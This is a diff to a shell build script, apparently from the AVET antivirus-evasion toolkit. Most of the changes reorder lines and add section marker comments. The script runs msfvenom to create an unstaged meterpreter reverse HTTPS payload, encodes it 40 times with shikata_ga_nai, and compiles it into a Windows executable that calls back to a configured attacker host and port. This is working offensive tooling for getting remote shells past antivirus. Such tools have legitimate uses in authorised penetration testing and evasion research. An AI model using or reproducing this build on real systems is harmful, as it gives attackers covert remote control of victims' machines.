@@ -1,13 +1,13 @@
-#!/bin/bash    
+#!/bin/bash
+
+
+#DESCRIPTION_START
 # Use unstaged meterpreter payload and apply shikata 40 times.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
-
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -15,9 +15,20 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# don't enable debug output because printing the whole unstaged payload takes a lot of time
+# enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter unstaged reverse payload, encoded 40 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter_reverse_https lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x86/shikata_ga_nai -i 40 -f c -a x86 --platform Windows > input/sc_c.txt
@@ -39,12 +50,14 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# don't enable debug output because printing the whole unstaged payload takes a lot of time
-# enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/40xshikata_revhttpsunstaged_win32.exe source/avet.c
 strip output/40xshikata_revhttpsunstaged_win32.exe
 
 # cleanup
 cleanup_techniques
+
+
+#USAGE_START
+# TODO
+#USAGE_END
